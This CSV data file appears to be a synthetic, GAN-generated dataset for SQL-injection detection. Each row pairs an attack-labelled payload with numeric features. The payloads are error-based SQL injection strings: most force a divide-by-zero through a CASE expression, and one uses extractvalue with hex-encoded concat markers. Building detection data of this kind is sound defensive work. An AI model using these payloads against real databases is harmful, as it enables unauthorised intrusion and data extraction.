id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000141,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000029,4.980413797727309,136.23370361328125,47.273468017578125,19.367822647094727,50.274593353271484,0.4195985198020935,50.525596618652344,15.287837028503418,0.9969308376312256,0.3461357057094574,0.17801253497600555,0.3779315650463104,0.10333354026079178,3.7669129371643066,0.4215780794620514,0.04611610621213913,0.7291432619094849,0.01829974167048931,0.5829304456710815,0.01926339976489544,4.507282257080078,4.59335470199585,1.7447843551635742,0.04854682832956314,0.9233009219169617,-0.0762668326497078,-0.03919624164700508,0.058802030980587006,0.08834727853536606,-0.281188428401947,0.2941877543926239,-0.015759587287902832,1.4432528018951416,-0.18750445544719696,0.49549591541290283,0.994752049446106,3.287017345428467,0.14519119262695312,1.4415137767791748,0.15782341361045837,-0.01199356559664011,0.8065264225006104,-0.1329226791858673,0.06453162431716919,-0.23063760995864868,0.10584986209869385,0.22784090042114258,0.5527645945549011,0.4606177508831024,0.4895106256008148,0.39847952127456665,0.5160030722618103,-0.07295281440019608,-0.16124233603477478,-0.11227073520421982,0.017725400626659393,-0.04858857020735741,0.1363978385925293,-0.08712800592184067,0.37664565443992615,-0.06840149313211441,0.1439441740512848,0.021201089024543762,0.07549989223480225,0.7207475304603577,-0.014029692858457565,0.2638601064682007,0.039576008915901184,-0.2347656935453415,-0.17699715495109558,0.19001013040542603,-0.04406706988811493,-0.02039990946650505,-0.2511526048183441,0.01853988878428936,-0.006325117312371731,0.3523483872413635,0.2140280306339264,0.15958571434020996,0.0008731037378311157,-0.12937238812446594,5.727321147918701,0.11627743393182755,0.12164179235696793,0.029197195544838905,0.6627777218818665,0.1157073825597763,-0.18921558558940887,0.014226153492927551
GAN_000142,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,5.034839122407192,136.03216552734375,48.37275314331055,20.594852447509766,50.824275970458984,1.2177215814590454,46.85575866699219,15.072263717651367,1.0864769220352173,0.33069077134132385,0.15340645611286163,0.37284332513809204,0.10555513948202133,3.7177274227142334,0.5079376697540283,0.061457883566617966,0.9632814526557922,0.04533379524946213,0.5709316730499268,0.00556502491235733,4.219515323638916,4.699122905731201,2.3877336978912354,0.1390235275030136,0.9335495233535767,-0.16466793417930603,-0.14639270305633545,0.039493680000305176,0.07008026540279388,-0.04527144879102707,0.22889429330825806,0.1471399962902069,1.594154953956604,0.10412892699241638,0.5893453359603882,0.908819317817688,3.3872745037078857,0.051070742309093475,1.3124970197677612,0.03301253914833069,-0.026627317070961,1.0026299953460693,-0.12211399525403976,0.05810132995247841,-0.23478156328201294,0.1115422397851944,0.1502077877521515,0.42590293288230896,0.4096517562866211,0.39433521032333374,0.27967774868011475,0.5815138816833496,0.09989435225725174,-0.06482993066310883,-0.16049186885356903,0.06517670303583145,0.16752250492572784,0.1272105574607849,-0.08728113770484924,0.07166053354740143,-0.04478657618165016,0.08204754441976547,0.07635334134101868,0.06120564416050911,0.608470618724823,-0.10939840972423553,0.37349674105644226,-0.15411445498466492,-0.13654762506484985,0.039408501237630844,0.0019020885229110718,-0.16843965649604797,-0.2396886646747589,0.12694230675697327,0.007462135050445795,0.024489540606737137,0.49058419466018677,0.13732343912124634,0.1237373799085617,-0.1717432737350464,-0.028651230037212372,6.639586448669434,0.0874340608716011,0.09429753571748734,-0.00501291872933507,0.5912268757820129,0.08069436252117157,0.21610616147518158,-0.16737443208694458
GAN_000143,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,5.014227124359185,135.83253479003906,48.04902267456055,20.72916603088379,50.636165618896484,2.3113479614257812,47.24361801147461,15.157061576843262,0.9681442975997925,0.32876476645469666,0.15444155037403107,0.37328144907951355,0.10322440415620804,3.744565010070801,0.461883544921875,0.02167605236172676,0.8469297289848328,0.017211614176630974,0.5840610265731812,-0.08613400906324387,4.290879726409912,4.738758563995361,2.5792338848114014,0.17498669028282166,0.9340030550956726,-0.02874038740992546,-0.14998432993888855,0.056914981454610825,0.09508384764194489,-0.05488458275794983,0.21773561835289001,0.17715156078338623,1.4274322986602783,0.06595805287361145,0.5905889868736267,0.9449384808540344,3.345989465713501,0.039236221462488174,1.3028860092163086,-0.1012449562549591,0.002649098401889205,1.1019505262374878,-0.11195134371519089,0.016738053411245346,-0.31236574053764343,0.21170881390571594,0.12374018877744675,0.40246084332466125,0.473644495010376,0.46771231293678284,0.3125353157520294,0.5943450927734375,0.04283004254102707,-0.06737786531448364,0.011899534612894058,0.2264353632926941,-0.07991783320903778,0.18609297275543213,-0.006756722927093506,0.03428560495376587,-0.03697013109922409,0.29939600825309753,0.18094304203987122,0.08486892282962799,0.5277085900306702,-0.07351173460483551,0.2927786707878113,-0.1942146122455597,-0.07532772421836853,-0.0021103322505950928,-0.06303086876869202,-0.14014729857444763,-0.12982116639614105,-0.027048178017139435,-0.01328571792691946,0.013514799997210503,0.5093199014663696,0.13631223142147064,0.1889808177947998,-0.30174463987350464,-0.018830381333827972,6.530391693115234,0.12842492759227753,0.14720791578292847,0.015289868228137493,0.5469725131988525,0.0670788437128067,0.27254217863082886,0.06732968986034393
GAN_000144,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,4.841709059979548,136.3462677001953,47.589908599853516,21.623197555541992,50.86104202270508,1.274279236793518,46.92068099975586,14.881237983703613,1.0565078258514404,0.3581315279006958,0.15732860565185547,0.3746700882911682,0.10666676610708237,3.7388432025909424,0.36305370926856995,0.048316895961761475,0.8169715404510498,0.05162407085299492,0.5207269191741943,0.041280291974544525,4.29950475692749,4.632805824279785,2.518778085708618,0.15797147154808044,1.0164287090301514,-0.07764393091201782,-0.07510623335838318,0.06016373261809349,-0.0009281095117330551,-0.02247639000415802,0.15086939930915833,-0.03175140917301178,1.478410005569458,0.017028111964464188,0.54450523853302,1.0162978172302246,3.34963321685791,0.07883872836828232,1.4456117153167725,0.04942748695611954,-0.0061751725152134895,1.015049695968628,0.05938633903861046,0.052374958992004395,-0.13049225509166718,0.15421533584594727,-0.03978222608566284,0.46613097190856934,0.4509504437446594,0.44147181510925293,0.4343421161174774,0.49376505613327026,-0.057092227041721344,-0.12484869360923767,2.145674079656601e-05,0.06780825555324554,0.011914703994989395,0.04146406427025795,-0.09880663454532623,0.16928744316101074,-0.07173983007669449,-0.037348613142967224,0.08792921900749207,0.018167439848184586,0.6061316728591919,-0.03157511726021767,0.35557571053504944,-0.10617513954639435,-0.09656943380832672,0.013967342674732208,0.16688431799411774,-0.04408888518810272,-0.05298691615462303,0.0023617371916770935,0.014274909161031246,0.018994057551026344,0.39318549633026123,0.2158421128988266,0.13162942230701447,0.03370075672864914,-0.013411886990070343,6.699633598327637,0.07259176671504974,0.1476929783821106,0.053855981677770615,0.5035873651504517,-0.11102207005023956,-0.03543201833963394,-0.07944193482398987
GAN_000145,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000047,4.8247343997798335,136.2730712890625,48.66244888305664,21.584918975830078,50.77568054199219,0.9917791485786438,46.143131256103516,14.981953620910645,0.9956027865409851,0.35690072178840637,0.15481685101985931,0.3739388883113861,0.1044890359044075,3.7284975051879883,0.41618016362190247,0.05299901217222214,0.9195539355278015,0.050061021000146866,0.5436820983886719,-0.0387626476585865,4.4470744132995605,4.554528713226318,2.536684274673462,0.11373598128557205,0.9618602991104126,0.051830507814884186,0.05221766605973244,0.10077622532844543,0.12732966244220734,-0.014649845659732819,0.17960262298583984,-0.03694392740726471,1.5968961715698242,-0.01205110177397728,0.540090799331665,1.051914930343628,3.396533966064453,0.10001485049724579,1.4900426864624023,-0.09890829771757126,0.016862574964761734,0.9308616518974304,0.1409902274608612,0.06148934364318848,-0.09186287969350815,0.05689295008778572,0.06828153878450394,0.4387076795101166,0.4980367422103882,0.521184504032135,0.44236376881599426,0.5049062371253967,0.04756544902920723,-0.06362789869308472,-0.02717883326113224,0.08512599766254425,0.12486617267131805,0.007754024118185043,-0.17889335751533508,0.24177655577659607,-0.0646839514374733,0.03746283799409866,0.1292046159505844,0.07580456137657166,0.6440356373786926,0.022757984697818756,0.3720521032810211,-0.09580440074205399,-0.062145866453647614,-0.0207512304186821,0.07721015810966492,-0.14644232392311096,-0.09360191226005554,-0.08344448357820511,0.013097120448946953,0.01068335585296154,0.3658388555049896,0.20051229000091553,0.12399693578481674,-0.0069413259625434875,-0.04413645714521408,6.674768447875977,0.07320694625377655,0.07851506024599075,0.06859564036130905,0.5831242799758911,-0.037757229059934616,-0.10503676533699036,0.07202228903770447
GAN_000146,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.902725338422675,136.5672149658203,48.57439422607422,21.533809661865234,51.135581970214844,1.612870454788208,47.57844924926758,15.108792304992676,1.151214599609375,0.3343988358974457,0.14426787197589874,0.3723124563694,0.10526620596647263,3.746791124343872,0.588825523853302,0.0882132351398468,0.904639720916748,0.022922096773982048,0.5917696356773376,-0.04547051340341568,4.416290283203125,4.515717506408691,3.011909246444702,0.03610338643193245,0.9323953986167908,-0.16888627409934998,0.05261483043432236,0.017099421471357346,-0.019053254276514053,0.055591486394405365,0.19815108180046082,-0.0626186802983284,1.59912109375,0.1020350307226181,0.48921746015548706,1.0095199346542358,3.2595150470733643,0.010731120593845844,1.4243206977844238,-0.04009076952934265,0.014146381057798862,1.0477195978164673,0.0019734129309654236,0.0465284027159214,-0.23369309306144714,0.29704388976097107,-0.014896214008331299,0.547214925289154,0.4456033706665039,0.4606846868991852,0.34176328778266907,0.6774692535400391,-0.1579340696334839,-0.11520256847143173,0.0731312483549118,0.06062202900648117,0.09907826781272888,0.044830311089754105,-0.012343332171440125,0.2974124252796173,-0.142064169049263,0.30741438269615173,0.008190333843231201,0.03046216443181038,0.5580878853797913,-0.08645737916231155,0.25633856654167175,-0.1347571462392807,-0.04841231554746628,-0.054065220057964325,-0.00824909657239914,-0.07760966569185257,-0.09919676184654236,-0.10605155676603317,0.02705560438334942,0.018971053883433342,0.3199904263019562,0.10649613291025162,0.1853983998298645,-0.22307546436786652,-0.15225130319595337,6.638314247131348,0.09349585324525833,0.23495183885097504,0.003812453942373395,0.5827428102493286,-0.04690484330058098,0.25809362530708313,0.11176110804080963
GAN_000147,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.862173334015891,136.35923767089844,47.67155456542969,19.454355239868164,50.83938217163086,1.417288064956665,47.895042419433594,15.321884155273438,1.045379877090454,0.33796340227127075,0.15041477978229523,0.3736683130264282,0.10593388974666595,3.744580030441284,0.5268334746360779,0.045912258327007294,0.7455283403396606,0.0399722196161747,0.456813782453537,-0.037609346210956573,4.420748233795166,4.450146675109863,2.1121833324432373,0.14817696809768677,0.9677461385726929,-0.038630735129117966,-0.08613887429237366,-0.0666704773902893,-0.14266662299633026,-0.05760498344898224,0.2254667580127716,0.0534832701086998,1.3975846767425537,-0.10223761200904846,0.48907241225242615,0.9181235432624817,3.2599077224731445,0.004382004030048847,1.4581233263015747,0.10240844637155533,0.010820315219461918,1.08642578125,0.11976935714483261,0.05959359556436539,0.005540952086448669,0.22513467073440552,0.07437915354967117,0.4760075509548187,0.28830525279045105,0.47812676429748535,0.397368848323822,0.7269188761711121,0.14953120052814484,-0.1159840002655983,0.10589928925037384,0.0046223923563957214,-0.07251773774623871,-0.09100113809108734,-0.04091538488864899,0.12292376160621643,-0.05642157047986984,0.14368385076522827,0.031063705682754517,0.10355415940284729,0.6679538488388062,0.10640807449817657,0.28834468126296997,0.08382943272590637,-0.17712204158306122,-0.17888760566711426,-0.04786234349012375,-0.1327640861272812,-0.1593846082687378,0.01334574818611145,0.002713219029828906,0.03250432759523392,0.27571165561676025,0.07112535834312439,0.113693006336689,-0.21093103289604187,0.13834983110427856,6.811226844787598,0.10700803250074387,0.006313800811767578,0.007881361059844494,0.593051552772522,-0.002698395401239395,0.22784145176410675,-0.05890538543462753
GAN_000148,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,4.850251601264509,136.7872314453125,47.18063735961914,19.85849952697754,50.904197692871094,1.6984095573425293,48.47894287109375,15.034488677978516,0.9905466437339783,0.34324395656585693,0.1575239598751068,0.3721092939376831,0.10601308941841125,3.749279022216797,0.34964272379875183,0.051822952926158905,0.7158695459365845,0.020773371681571007,0.48945352435112,-0.15771842002868652,4.329950332641602,4.576137065887451,1.8835651874542236,0.1311565339565277,1.0090254545211792,-0.07298407703638077,-0.04366435110569,-0.08709478378295898,-0.13223986327648163,-0.03863939642906189,0.2613877058029175,0.06242888420820236,1.3944282531738281,-0.10848921537399292,0.5267085433006287,0.9478017091751099,3.3480172157287598,0.04707329720258713,1.4172247648239136,0.1147097572684288,-0.0015773001359775662,1.0828477144241333,-0.007268182933330536,0.048697579652071,-0.09800086170434952,0.16348905861377716,0.018442578613758087,0.3796217739582062,0.3934875428676605,0.4804880619049072,0.37993893027305603,0.5878517627716064,0.03009217604994774,-0.04426457732915878,0.032989758998155594,-0.005070112645626068,-0.08586636185646057,-0.056435611099004745,0.026164047420024872,0.1737210750579834,-0.11798674613237381,0.0834420844912529,0.15471500158309937,-0.03824727609753609,0.6253583431243896,-0.0002535581588745117,0.33625081181526184,0.04171609878540039,-0.12990793585777283,-0.0978424921631813,0.0677766352891922,0.03313712030649185,-0.01579458639025688,0.009322777390480042,0.00901719182729721,0.01957056298851967,0.341232031583786,0.16918349266052246,0.08184685558080673,-0.08505694568157196,0.1510145366191864,6.861330509185791,0.11674803495407104,0.06175005063414574,0.06329839676618576,0.5025210380554199,0.01896820217370987,0.14204618334770203,0.003830164670944214
GAN_000149,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.800750397844642,137.25013732910156,46.570098876953125,21.648189544677734,50.57466506958008,1.843017578125,48.41761016845703,14.916607856750488,1.0703208446502686,0.35470297932624817,0.15840545296669006,0.3747008740901947,0.1061372458934784,3.7446670532226562,0.31056755781173706,0.06777743250131607,0.821161687374115,0.07269977778196335,0.5181984305381775,-0.12579934298992157,4.404290676116943,4.61845064163208,1.9393061399459839,0.2577696442604065,1.0331586599349976,0.001677362248301506,-0.057269833981990814,-0.09501773118972778,0.1163398027420044,-0.16068722307682037,0.26301828026771545,0.03392856568098068,1.5895776748657227,-0.08204959332942963,0.4876033663749695,0.9830865263938904,3.3269405364990234,0.07432364672422409,1.4727835655212402,0.13108649849891663,0.0005209639784879982,0.9448083639144897,-0.09537262469530106,0.07045648992061615,-0.05265198275446892,0.07427691668272018,0.02881581336259842,0.45653390884399414,0.45764830708503723,0.5146686434745789,0.4623408913612366,0.5499948859214783,-0.0768418088555336,-0.04191990941762924,-0.005625550635159016,0.1581270694732666,-0.01448092982172966,0.13408279418945312,-0.0018026679754257202,0.05196479335427284,-0.02925599366426468,0.12759408354759216,0.12012756615877151,-0.04968710616230965,0.6887011528015137,-0.0743217021226883,0.35938939452171326,0.019872009754180908,-0.1483609527349472,-0.007351592183113098,0.06018698960542679,0.009329489432275295,-0.054290492087602615,-0.09673219174146652,0.02043522335588932,0.028935587033629417,0.297033429145813,0.17370161414146423,0.31831279397010803,0.037626877427101135,0.07201594114303589,6.83451509475708,0.08570824563503265,0.046347614377737045,0.05397310480475426,0.5562707185745239,0.0032374411821365356,0.056315336376428604,0.017857886850833893
GAN_000150,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.8556673603723075,135.4127655029297,47.68019485473633,20.558551788330078,51.06760025024414,0.9282963871955872,49.078269958496094,15.04340934753418,0.9369590878486633,0.3469139039516449,0.14252929389476776,0.37284794449806213,0.10347091406583786,3.7412381172180176,0.4631902575492859,0.07589494436979294,0.745134174823761,-0.02875429578125477,0.5105205178260803,-0.10142307728528976,4.464980125427246,4.62692403793335,2.4913177490234375,0.216801255941391,0.9713944792747498,-0.13189341127872467,-0.05233308672904968,-0.07073719799518585,-0.1377083659172058,-0.05424818396568298,0.19047074019908905,0.12571373581886292,1.3553475141525269,-0.2185966968536377,0.5188427567481995,0.9731067419052124,3.360440969467163,0.03283636271953583,1.4345569610595703,-0.02859458699822426,0.013298301957547665,1.0367878675460815,-0.15807807445526123,0.05513755977153778,-0.03228672593832016,0.21629896759986877,0.07292298227548599,0.4488220512866974,0.38600683212280273,0.4957371652126312,0.356099933385849,0.6535953879356384,-0.035339608788490295,0.008591607213020325,0.12954996526241302,-0.03246647119522095,-0.034509506076574326,-0.0008095800876617432,0.07740860432386398,0.3752185106277466,0.07171310484409332,0.3046707808971405,-0.04888548702001572,0.029704447835683823,0.6284676194190979,0.18917496502399445,0.25474151968955994,0.00845184177160263,-0.23404662311077118,-0.05811021476984024,-0.10772714018821716,-0.08637811243534088,-0.073508620262146,-0.10259190946817398,0.008778956718742847,0.008339932188391685,0.36939847469329834,0.133703351020813,0.24572506546974182,-0.23149217665195465,-0.051137275993824005,6.450413703918457,0.1211879774928093,0.11672113835811615,0.01648925244808197,0.5572137236595154,-0.0664101094007492,0.23195593059062958,0.12950854003429413
GAN_000151,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000026,4.73448016282765,136.13070678710938,46.777565002441406,21.859697341918945,51.18803024291992,1.660752534866333,47.617618560791016,14.655153274536133,0.9139402508735657,0.36289459466934204,0.14895953238010406,0.37494537234306335,0.10497771203517914,3.7443175315856934,0.3253656327724457,0.058921169489622116,0.8263325095176697,0.06452611088752747,0.5363366007804871,0.003469988703727722,4.361203670501709,4.720085620880127,2.4349076747894287,0.21792519092559814,1.0115001201629639,0.014169255271553993,-0.003467694390565157,0.08707504719495773,0.005992860067635775,-0.013002216815948486,0.17682895064353943,0.011287130415439606,1.4428863525390625,-0.17121049761772156,0.549720048904419,1.0383434295654297,3.4158425331115723,0.08775004744529724,1.4485758543014526,0.027879953384399414,-0.005248802714049816,1.0730761289596558,-0.05751704424619675,0.05920856073498726,-0.07429176568984985,0.09896737337112427,-0.04453105479478836,0.4495415985584259,0.4575147330760956,0.48261845111846924,0.445743590593338,0.507969856262207,0.03667629137635231,0.007750228047370911,0.023652885109186172,0.04843944311141968,-0.011663693934679031,0.014276068657636642,-0.13367107510566711,0.09544215351343155,0.06078539788722992,-0.027608193457126617,0.03425287455320358,-0.0005968101322650909,0.6126571297645569,-0.030153684318065643,0.32540392875671387,-0.03471759706735611,-0.11767648160457611,0.0676746591925621,0.11723408102989197,0.01782430335879326,-0.09343251585960388,-0.021448589861392975,0.01509516779333353,0.013467557728290558,0.38991206884384155,0.2143455445766449,0.23480500280857086,0.023028625175356865,-0.002562694251537323,6.925323486328125,0.06723614782094955,0.05395282804965973,0.06384849548339844,0.5034735202789307,-0.0919792428612709,0.041209470480680466,-0.012222185730934143
GAN_000152,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000020,4.971144714305528,136.15444946289062,48.328922271728516,22.1215763092041,49.998600006103516,1.136380910873413,48.37726593017578,15.163202285766602,1.018450379371643,0.327266126871109,0.16372239589691162,0.3733803927898407,0.10503751039505005,3.7247679233551025,0.4741442799568176,0.05867702141404152,0.8859553337097168,0.04117095097899437,0.5173771381378174,-0.006673252210021019,4.3569817543029785,4.713619709014893,2.237175226211548,0.07429643720388412,0.96321040391922,-0.07561111450195312,-0.002988640684634447,0.13090968132019043,-0.02965123951435089,-0.039251528680324554,0.15668310225009918,0.11313792318105698,1.4911309480667114,0.03846122324466705,0.5311442017555237,1.031711459159851,3.382391929626465,0.06401834636926651,1.366848111152649,-0.04997990280389786,-0.004120145924389362,1.0273547172546387,-0.1040131077170372,0.04162861406803131,-0.09596535563468933,0.23428475856781006,0.10108973830938339,0.47683632373809814,0.43167316913604736,0.45209264755249023,0.34272414445877075,0.5663952827453613,-0.007675893604755402,0.051021575927734375,0.03052155114710331,0.16847483813762665,0.09565851092338562,0.2777279317378998,-0.0476263165473938,0.22072181105613708,0.08286012709140778,0.059103988111019135,-0.03993924707174301,0.14655442535877228,0.6462598443031311,-0.13718131184577942,0.3622383177280426,-0.28899770975112915,-0.10735989362001419,-0.07862498611211777,0.09090699255466461,-0.12322454154491425,-0.12538620829582214,0.07033982872962952,0.011476718820631504,0.010941548272967339,0.478914737701416,0.16621190309524536,0.09837127476930618,-0.18317516148090363,-0.005351424217224121,6.765695095062256,0.08873719722032547,0.23934948444366455,0.020252805203199387,0.5230861902236938,-0.03070966899394989,0.04167802259325981,0.04731178283691406
GAN_000153,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,4.755591829814628,136.1631622314453,48.02210998535156,20.393857955932617,50.62653350830078,2.1334927082061768,46.35293197631836,14.86953067779541,0.9607828259468079,0.3575935661792755,0.163479283452034,0.3737248480319977,0.10600869357585907,3.7508785724639893,0.30235472321510315,0.0443558432161808,0.7908545732498169,0.05776841565966606,0.5639122128486633,-0.014413807541131973,4.3697943687438965,4.556895732879639,2.093202829360962,0.13307036459445953,1.0065233707427979,-0.004230299964547157,0.00908187311142683,0.05549713969230652,0.08965299278497696,0.053550317883491516,0.19670537114143372,-0.09369514882564545,1.348422646522522,-0.08879469335079193,0.5004163980484009,1.032665729522705,3.3827621936798096,0.08256348967552185,1.4356902837753296,-0.027280542999505997,0.002074938965961337,1.0012565851211548,0.02368215098977089,0.06681118905544281,-0.14982718229293823,0.04969707876443863,0.014239847660064697,0.47903990745544434,0.45454493165016174,0.4802800118923187,0.4773312509059906,0.49899324774742126,0.0027568265795707703,0.030628390610218048,0.03440731018781662,0.04865045100450516,-0.06699475646018982,-0.05557287111878395,-0.09120966494083405,0.14834237098693848,-0.06951002776622772,-0.07857061922550201,0.09401446580886841,0.09475526213645935,0.6040915846824646,-0.021882444620132446,0.326213002204895,-0.009187206625938416,-0.05313091352581978,0.05247369781136513,0.15303020179271698,0.0250844843685627,0.03363986685872078,-0.04441135376691818,0.015362529084086418,0.011949951760470867,0.3693210184574127,0.185435488820076,0.11022347211837769,0.040040403604507446,0.14407460391521454,6.733823776245117,0.07887346297502518,0.05398542433977127,0.08225627988576889,0.5417003035545349,0.005247451364994049,0.0196135975420475,-0.010869130492210388
GAN_000154,attack,error,select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000027,4.949111149934095,136.5155029296875,45.78380584716797,21.780977249145508,50.54759216308594,0.8067917227745056,48.99724578857422,15.23825454711914,0.9184985160827637,0.34922459721565247,0.16755443811416626,0.3720666766166687,0.10705568641424179,3.7507855892181396,0.42683249711990356,0.0021451758220791817,0.7171273231506348,0.06899189949035645,0.5095186233520508,0.18964795768260956,4.316341876983643,4.609821319580078,2.330261707305908,0.09862875193357468,0.9673832058906555,0.027965093031525612,-0.17868797481060028,0.039813704788684845,0.1019691452383995,-0.030095793306827545,0.23309403657913208,-0.15838061273097992,1.5591630935668945,0.017365779727697372,0.470450222492218,1.0130220651626587,3.342343330383301,0.06532920897006989,1.3869129419326782,0.05871164798736572,-0.006015169434249401,0.9800738096237183,0.0482177808880806,0.06558912992477417,-0.015839815139770508,0.18817287683486938,0.18551376461982727,0.49366945028305054,0.4735252559185028,0.5038202404975891,0.4604676365852356,0.49757567048072815,0.07905548810958862,-0.25485068559646606,-0.12565328180789948,0.15315565466880798,-0.014970075339078903,0.19119225442409515,-0.23977886140346527,0.23565256595611572,-0.0641632229089737,0.029007665812969208,0.13539747893810272,0.11487588286399841,0.6340094804763794,0.03892546147108078,0.25619474053382874,0.021007433533668518,-0.12369927763938904,-0.05004376918077469,0.0038544759154319763,-0.07626286894083023,-0.09395843744277954,-0.04587709158658981,0.002738933777436614,0.013622344471514225,0.38679224252700806,0.14135612547397614,0.13140231370925903,0.15501375496387482,0.04464177042245865,6.643195152282715,0.09368198364973068,0.1477181613445282,0.02358327805995941,0.5428067445755005,-0.06767785549163818,0.0025940947234630585,-0.046581756323575974
